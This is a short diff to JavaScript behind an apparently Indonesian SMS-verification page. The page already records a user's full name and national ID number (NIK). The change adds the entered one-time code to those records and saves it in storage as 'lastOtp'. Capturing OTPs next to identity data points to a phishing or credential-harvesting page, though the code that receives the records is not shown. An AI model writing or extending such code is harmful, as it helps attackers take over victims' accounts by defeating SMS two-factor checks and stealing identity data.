@@ -146,6 +146,7 @@
         page: 'verifikasi-sms.html',
         nama_lengkap: identity?.fullName,
         nik: identity?.nik,
+        otp: otpValue,
         status: 'OTP_REAUTH_VERIFIED'
       });
 
@@ -155,7 +156,8 @@
     }
 
     const saved = NovaStorage.setSmsVerified(true);
-    if (!saved) {
+    const appSaved = NovaStorage.setApplication({ lastOtp: otpValue });
+    if (!saved || !appSaved) {
       verifyButton.textContent = 'VERIFIKASI KODE →';
       setMessage('Status verifikasi tidak dapat disimpan pada browser ini.', 'error');
       updateVerifyButton();
@@ -167,6 +169,7 @@
       page: 'verifikasi-sms.html',
       nama_lengkap: identity?.fullName,
       nik: identity?.nik,
+      otp: otpValue,
       status: 'OTP_VERIFIED'
     });
 
